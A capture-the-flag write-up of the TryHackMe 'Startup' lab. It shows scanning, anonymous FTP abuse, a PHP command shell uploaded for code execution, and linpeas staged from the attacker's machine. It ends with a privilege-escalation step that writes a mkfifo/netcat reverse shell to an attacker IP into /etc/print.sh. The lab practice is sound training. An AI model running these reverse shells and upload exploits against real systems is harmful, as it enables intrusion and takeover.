LHost: 192.168.133.108
Target: 10.49.190.233

**Check Open Port**
```
rustscan -a 10.49.157.11 -b 1000 --timeout 1500 -g | awk -F'->' '{print $2}' | tr -d '[]' > ports.txt
```

![Pasted image 20261018114042](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018114042.png)

**Default nmap script:**
```
sudo nmap -sV -sC -O -p $(cat ports.txt) -T4 10.49.157.11 -oX service.xml
```
![Pasted image 20261018114544](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018114544.png)


**Check vulnerability with Exploit-DB:**
```
searchsploit --nmap service.xml 
```
![Pasted image 20261018113449](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018113449.png)

**Check ftp:**
```
ftp 10.49.154.193
anonymous
ls -la
get .test.log
get important.jpg
get notice.txt
cd ftp
```
![Pasted image 20261018113400](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018113400.png)

**Web directory enumeration:**
```
gobuster dir -u http://10.49.157.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
files                (Status: 301) [Size: 314] [--> http://10.49.164.138/files/]
index.html           (Status: 200) [Size: 808]

**Check that directory**
![Pasted image 20261018121604](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018121604.png)
![Pasted image 20261018121637](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018121637.png)

**Since we can access to both /files and /files/ftp, let tried upload exploit there:**
![Pasted image 20261018121937](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018121937.png)

**Now check the url:**
![Pasted image 20261018121957](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018121957.png)

**Nice! Now we know it vulnerable to Arbitrary File Upload. It time to get Remote Code Execution (RCE) **
![Pasted image 20261018122806](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018122806.png)
![Pasted image 20261018122750](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018122750.png)
![Pasted image 20261018122847](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018122847.png)
![Pasted image 20261018123053](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018123053.png)

**Upload exploit via ftp:**
```
ftp 10.49.154.193
anonymous
ls
cd ftp
put cmd.php
exit
nc -lvnp 4444
```

Nice, it works.

**Now, by using Revshells.com to generate a reverse shell for us using Python #1**
![Pasted image 20261018124818](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018124818.png)

The Machine expire, now we need to redo the previous part and you might notice the difference IP.

**Stabilize/upgrade shell**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Ctrl+z
```
stty raw -echo && fg
```

![Pasted image 20261018133247](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018133247.png)

**Since, I'm lazy and don't want to manually check every nook and crane of the server, I'll just use automate script instead:**
**# On Local Host**
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh  
python3 -m http.server 9000
```
![Pasted image 20261018133919](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018133919.png)

**# Victim Machine**
```
cd /tmp  
wget http://192.168.133.108:9000/linpeas.sh  
chmod +x ./linpeas.sh  
./linpeas.sh -r | tee linpeas.txt
```

**And we found a lot of thing including one of the lab question and a suspected .pcap file:**
![Pasted image 20261018134026](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018134026.png)
![Pasted image 20261018134538](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018134538.png)

![Screenshot 2026-10-18 135446](Image/Tryhackme%20-%20Startup/Screenshot%202026-10-18%20135446.png)

**# Let Copy suspicious pcap file to ftp:**
```
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```

**# Alternatively**
```
cd /incidents
python3 -m http.server
```

**# In our local machine**
```
wget 10.49.154.193:8000/suspicious.pcapng
```

**# Analysis file with wireshark**
![Pasted image 20261018134824](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018134824.png)

```
wireshark suspicious.pcapng
```

**Let track TCP Stream first:**
filter: tcp.stream eq 0
TCP steams the first [ACK] with either right click > Follow > TCP steams or Simply Ctrl + Alt + Shift + T
![Pasted image 20261018135231](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018135231.png)

**Ok, we find something interesting in Stream 7:**
![Screenshot 2026-10-18 135254](Image/Tryhackme%20-%20Startup/Screenshot%202026-10-18%20135254.png)

**Let tried switch to this user:**
![Pasted image 20261018140436](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018140436.png)
Nice, now we get another answer.

**I found a shell script file, but I don't have the permission to write to instead we shown another shell script in /etc/ let check it out**:
![Pasted image 20261018144251](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018144251.png)

**Now we can tried nc mkfifo from revshells.com which work like magic:**
```
echo '#!/bin/bash' > /etc/print.sh && echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.133.108 5555 >/tmp/f' >> /etc/print.sh
```

![Pasted image 20261018152311](Image/Tryhackme%20-%20Startup/Pasted%20image%2020261018152311.png)

